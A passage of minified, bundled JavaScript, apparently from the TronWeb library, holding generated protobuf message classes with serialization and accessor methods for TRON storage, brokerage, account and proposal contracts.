        ,
        t.inherits(TronWebProto.BuyStorageContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.BuyStorageContract.displayName = "TronWebProto.BuyStorageContract"),
        TronWebProto.SellStorageContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.SellStorageContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.SellStorageContract.displayName = "TronWebProto.SellStorageContract"),
        TronWebProto.UpdateBrokerageContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.UpdateBrokerageContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.UpdateBrokerageContract.displayName = "TronWebProto.UpdateBrokerageContract"),
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.BuyStorageBytesContract.prototype.toObject = function(i) {
            return TronWebProto.BuyStorageBytesContract.toObject(i, this)
        }
        ,
        TronWebProto.BuyStorageBytesContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                bytes: e.Message.getFieldWithDefault(n, 2, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.BuyStorageBytesContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.BuyStorageBytesContract;
            return TronWebProto.BuyStorageBytesContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.BuyStorageBytesContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setBytes(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.BuyStorageBytesContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.BuyStorageBytesContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.BuyStorageBytesContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getBytes(),
            s !== 0 && n.writeInt64(2, s)
        }
        ,
        TronWebProto.BuyStorageBytesContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.BuyStorageBytesContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.BuyStorageBytesContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.BuyStorageBytesContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.BuyStorageBytesContract.prototype.getBytes = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.BuyStorageBytesContract.prototype.setBytes = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.BuyStorageContract.prototype.toObject = function(i) {
            return TronWebProto.BuyStorageContract.toObject(i, this)
        }
        ,
        TronWebProto.BuyStorageContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                quant: e.Message.getFieldWithDefault(n, 2, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.BuyStorageContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.BuyStorageContract;
            return TronWebProto.BuyStorageContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.BuyStorageContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setQuant(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.BuyStorageContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.BuyStorageContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.BuyStorageContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getQuant(),
            s !== 0 && n.writeInt64(2, s)
        }
        ,
        TronWebProto.BuyStorageContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.BuyStorageContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.BuyStorageContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.BuyStorageContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.BuyStorageContract.prototype.getQuant = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.BuyStorageContract.prototype.setQuant = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.SellStorageContract.prototype.toObject = function(i) {
            return TronWebProto.SellStorageContract.toObject(i, this)
        }
        ,
        TronWebProto.SellStorageContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                storageBytes: e.Message.getFieldWithDefault(n, 2, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.SellStorageContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.SellStorageContract;
            return TronWebProto.SellStorageContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.SellStorageContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setStorageBytes(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.SellStorageContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.SellStorageContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.SellStorageContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getStorageBytes(),
            s !== 0 && n.writeInt64(2, s)
        }
        ,
        TronWebProto.SellStorageContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.SellStorageContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.SellStorageContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.SellStorageContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.SellStorageContract.prototype.getStorageBytes = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.SellStorageContract.prototype.setStorageBytes = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.UpdateBrokerageContract.prototype.toObject = function(i) {
            return TronWebProto.UpdateBrokerageContract.toObject(i, this)
        }
        ,
        TronWebProto.UpdateBrokerageContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                brokerage: e.Message.getFieldWithDefault(n, 2, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.UpdateBrokerageContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.UpdateBrokerageContract;
            return TronWebProto.UpdateBrokerageContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.UpdateBrokerageContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt32();
                    i.setBrokerage(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.UpdateBrokerageContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.UpdateBrokerageContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.UpdateBrokerageContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getBrokerage(),
            s !== 0 && n.writeInt32(2, s)
        }
        ,
        TronWebProto.UpdateBrokerageContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.UpdateBrokerageContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.UpdateBrokerageContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.UpdateBrokerageContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.UpdateBrokerageContract.prototype.getBrokerage = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.UpdateBrokerageContract.prototype.setBrokerage = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        t.object.extend(r, TronWebProto)
    }(XT)),
    XT
}
Ige();
var JT = {}, xW;
function Oge() {
    return xW || (xW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")()
          , i = A4();
        t.object.extend(proto, i),
        t.exportSymbol("TronWebProto.AccountCreateContract", null, o),
        t.exportSymbol("TronWebProto.AccountPermissionUpdateContract", null, o),
        t.exportSymbol("TronWebProto.AccountUpdateContract", null, o),
        t.exportSymbol("TronWebProto.SetAccountIdContract", null, o),
        TronWebProto.AccountCreateContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.AccountCreateContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AccountCreateContract.displayName = "TronWebProto.AccountCreateContract"),
        TronWebProto.AccountUpdateContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.AccountUpdateContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AccountUpdateContract.displayName = "TronWebProto.AccountUpdateContract"),
        TronWebProto.SetAccountIdContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.SetAccountIdContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.SetAccountIdContract.displayName = "TronWebProto.SetAccountIdContract"),
        TronWebProto.AccountPermissionUpdateContract = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.AccountPermissionUpdateContract.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.AccountPermissionUpdateContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AccountPermissionUpdateContract.displayName = "TronWebProto.AccountPermissionUpdateContract"),
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountCreateContract.prototype.toObject = function(n) {
            return TronWebProto.AccountCreateContract.toObject(n, this)
        }
        ,
        TronWebProto.AccountCreateContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                accountAddress: s.getAccountAddress_asB64(),
                type: e.Message.getFieldWithDefault(s, 3, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.AccountCreateContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.AccountCreateContract;
            return TronWebProto.AccountCreateContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.AccountCreateContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setAccountAddress(l);
                    break;
                case 3:
                    var l = s.readEnum();
                    n.setType(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.AccountCreateContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.AccountCreateContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.AccountCreateContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getAccountAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getType(),
            a !== 0 && s.writeEnum(3, a)
        }
        ,
        TronWebProto.AccountCreateContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.AccountCreateContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.AccountCreateContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.AccountCreateContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.AccountCreateContract.prototype.getAccountAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.AccountCreateContract.prototype.getAccountAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getAccountAddress())
        }
        ,
        TronWebProto.AccountCreateContract.prototype.getAccountAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getAccountAddress())
        }
        ,
        TronWebProto.AccountCreateContract.prototype.setAccountAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.AccountCreateContract.prototype.getType = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.AccountCreateContract.prototype.setType = function(n) {
            return e.Message.setProto3EnumField(this, 3, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountUpdateContract.prototype.toObject = function(n) {
            return TronWebProto.AccountUpdateContract.toObject(n, this)
        }
        ,
        TronWebProto.AccountUpdateContract.toObject = function(n, s) {
            var a = {
                accountName: s.getAccountName_asB64(),
                ownerAddress: s.getOwnerAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.AccountUpdateContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.AccountUpdateContract;
            return TronWebProto.AccountUpdateContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.AccountUpdateContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setAccountName(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.AccountUpdateContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.AccountUpdateContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAccountName_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a)
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.getAccountName = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.getAccountName_asB64 = function() {
            return e.Message.bytesAsB64(this.getAccountName())
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.getAccountName_asU8 = function() {
            return e.Message.bytesAsU8(this.getAccountName())
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.setAccountName = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.AccountUpdateContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.SetAccountIdContract.prototype.toObject = function(n) {
            return TronWebProto.SetAccountIdContract.toObject(n, this)
        }
        ,
        TronWebProto.SetAccountIdContract.toObject = function(n, s) {
            var a = {
                accountId: s.getAccountId_asB64(),
                ownerAddress: s.getOwnerAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.SetAccountIdContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.SetAccountIdContract;
            return TronWebProto.SetAccountIdContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.SetAccountIdContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setAccountId(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.SetAccountIdContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.SetAccountIdContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAccountId_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a)
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.getAccountId = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.getAccountId_asB64 = function() {
            return e.Message.bytesAsB64(this.getAccountId())
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.getAccountId_asU8 = function() {
            return e.Message.bytesAsU8(this.getAccountId())
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.setAccountId = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.SetAccountIdContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.repeatedFields_ = [4],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountPermissionUpdateContract.prototype.toObject = function(n) {
            return TronWebProto.AccountPermissionUpdateContract.toObject(n, this)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.toObject = function(n, s) {
            var a, l = {
                ownerAddress: s.getOwnerAddress_asB64(),
                owner: (a = s.getOwner()) && i.Permission.toObject(n, a),
                witness: (a = s.getWitness()) && i.Permission.toObject(n, a),
                activesList: e.Message.toObjectList(s.getActivesList(), i.Permission.toObject, n)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.AccountPermissionUpdateContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.AccountPermissionUpdateContract;
            return TronWebProto.AccountPermissionUpdateContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = new i.Permission;
                    s.readMessage(l, i.Permission.deserializeBinaryFromReader),
                    n.setOwner(l);
                    break;
                case 3:
                    var l = new i.Permission;
                    s.readMessage(l, i.Permission.deserializeBinaryFromReader),
                    n.setWitness(l);
                    break;
                case 4:
                    var l = new i.Permission;
                    s.readMessage(l, i.Permission.deserializeBinaryFromReader),
                    n.addActives(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.AccountPermissionUpdateContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getOwner(),
            a != null && s.writeMessage(2, a, i.Permission.serializeBinaryToWriter),
            a = n.getWitness(),
            a != null && s.writeMessage(3, a, i.Permission.serializeBinaryToWriter),
            a = n.getActivesList(),
            a.length > 0 && s.writeRepeatedMessage(4, a, i.Permission.serializeBinaryToWriter)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.getOwner = function() {
            return e.Message.getWrapperField(this, i.Permission, 2)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.setOwner = function(n) {
            return e.Message.setWrapperField(this, 2, n)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.clearOwner = function() {
            return this.setOwner(void 0)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.hasOwner = function() {
            return e.Message.getField(this, 2) != null
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.getWitness = function() {
            return e.Message.getWrapperField(this, i.Permission, 3)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.setWitness = function(n) {
            return e.Message.setWrapperField(this, 3, n)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.clearWitness = function() {
            return this.setWitness(void 0)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.hasWitness = function() {
            return e.Message.getField(this, 3) != null
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.getActivesList = function() {
            return e.Message.getRepeatedWrapperField(this, i.Permission, 4)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.setActivesList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 4, n)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.addActives = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 4, n, TronWebProto.Permission, s)
        }
        ,
        TronWebProto.AccountPermissionUpdateContract.prototype.clearActivesList = function() {
            return this.setActivesList([])
        }
        ,
        t.object.extend(r, TronWebProto)
    }(JT)),
    JT
}
Oge();
var QT = {}, wW;
function Rge() {
    return wW || (wW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")();
        t.exportSymbol("TronWebProto.ProposalApproveContract", null, o),
        t.exportSymbol("TronWebProto.ProposalCreateContract", null, o),
        t.exportSymbol("TronWebProto.ProposalDeleteContract", null, o),
        TronWebProto.ProposalApproveContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ProposalApproveContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ProposalApproveContract.displayName = "TronWebProto.ProposalApproveContract"),
        TronWebProto.ProposalCreateContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ProposalCreateContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ProposalCreateContract.displayName = "TronWebProto.ProposalCreateContract"),
        TronWebProto.ProposalDeleteContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ProposalDeleteContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ProposalDeleteContract.displayName = "TronWebProto.ProposalDeleteContract"),
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ProposalApproveContract.prototype.toObject = function(i) {
            return TronWebProto.ProposalApproveContract.toObject(i, this)
        }
        ,
        TronWebProto.ProposalApproveContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                proposalId: e.Message.getFieldWithDefault(n, 2, 0),
                isAddApproval: e.Message.getBooleanFieldWithDefault(n, 3, !1)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.ProposalApproveContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.ProposalApproveContract;
            return TronWebProto.ProposalApproveContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.ProposalApproveContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setProposalId(a);
                    break;
                case 3:
                    var a = n.readBool();
                    i.setIsAddApproval(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.ProposalApproveContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.ProposalApproveContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getProposalId(),
            s !== 0 && n.writeInt64(2, s),
            s = i.getIsAddApproval(),
            s && n.writeBool(3, s)
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.getProposalId = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.setProposalId = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.getIsAddApproval = function() {
            return e.Message.getBooleanFieldWithDefault(this, 3, !1)
        }
        ,
        TronWebProto.ProposalApproveContract.prototype.setIsAddApproval = function(i) {
            return e.Message.setProto3BooleanField(this, 3, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ProposalCreateContract.prototype.toObject = function(i) {
            return TronWebProto.ProposalCreateContract.toObject(i, this)
        }
        ,
        TronWebProto.ProposalCreateContract.toObject = function(i, n) {
            var s, a = {
                ownerAddress: n.getOwnerAddress_asB64(),
                parametersMap: (s = n.getParametersMap()) ? s.toObject(i, void 0) : []
            };
            return i && (a.$jspbMessageInstance = n),
            a
        }
        ),
        TronWebProto.ProposalCreateContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.ProposalCreateContract;
            return TronWebProto.ProposalCreateContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.ProposalCreateContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
